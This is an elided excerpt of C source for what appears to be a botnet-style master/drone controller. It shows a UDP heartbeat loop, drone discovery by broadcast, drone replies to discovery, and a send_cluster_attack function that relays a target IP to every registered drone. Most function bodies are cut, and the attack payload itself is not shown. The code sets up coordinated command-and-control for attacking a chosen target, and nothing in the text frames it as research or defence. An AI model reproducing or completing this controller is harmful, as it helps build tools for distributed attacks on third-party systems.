...
void *heartbeat_thread(void *arg) {
  ...
  while (hb_active) {
    sendto(sock_fd, &pkt, sizeof(pkt), 0, (struct sockaddr *)&dest,
           sizeof(dest));
    sleep(5);
  }
  return NULL;
...
void run_drone_mode(const char *master_ip) {
  ...
  while (1) {
    int len = recvfrom(sock_fd, &pkt, sizeof(pkt), 0,
    ...
    if (len > 0) {
      ...
      if (pkt.cmd == CMD_DISCOVERY) {
        ...
        sendto(sock_fd, &reply, sizeof(reply), 0, (struct sockaddr *)&sender,
               sender_len);
...
void discover_drones() {
  ...
  sendto(master_sock, &pkt, sizeof(pkt), 0, (struct sockaddr *)&bcast,
         sizeof(bcast));
  printf("CLUSTER: Broadcast Discovery sent (Waiting for "
         "replies/heartbeats...)\n");
}
...
void send_cluster_attack(const char *target_ip) {
  ...
  for (int i = 0; i < drone_count; i++) {
    ...
    sendto(master_sock, &pkt, sizeof(pkt), 0, (struct sockaddr *)&addr,
           sizeof(addr));
  }
...
int get_drone_count() { return drone_count; }
